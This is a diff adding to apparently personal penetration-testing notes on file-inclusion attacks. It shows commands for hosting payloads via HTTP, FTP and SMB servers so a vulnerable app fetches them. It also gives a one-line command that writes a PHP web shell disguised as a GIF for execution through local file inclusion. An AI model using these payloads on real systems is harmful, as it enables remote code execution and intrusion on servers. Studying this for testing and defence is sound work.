@@ -162,3 +162,23 @@ We can test to see if an LFI is also an RFI by first, trying to include a local 
 
 We may still however be blocked by a firewall so we might not be able to pull files from external servers.
 
+Any form of payload can be uploaded (web shell, reverse shell, etc) and we can host it in a variety of ways to stay concealed / within firewall allowances:
+```bash
+python -m http.server [80/443]
+# http:// or https://
+
+python -m pyftpdlib -p 21
+# ftp://[ip]/ or ftp://[user]:[pass]@[ip]/
+
+impacket-smbserver -smb2support share $(pwd)
+# \\[ip]\[share]\
+```
+> If the vulnerable app is on a windows machine, then we don't actually need the `allow_url_include` setting to be enabled for SMB RFI.
+
+## LFI with File Uploads
+Sometimes we are able to upload files to a website, the file upload form doesn't need to vulnerable if we are able to upload a file containing some malicious text and then execute it via an LFI.
+
+Example using a GIF image (*A GIF's magic bytes are in ASCII so easy to forge*):
+```bash
+echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
+```
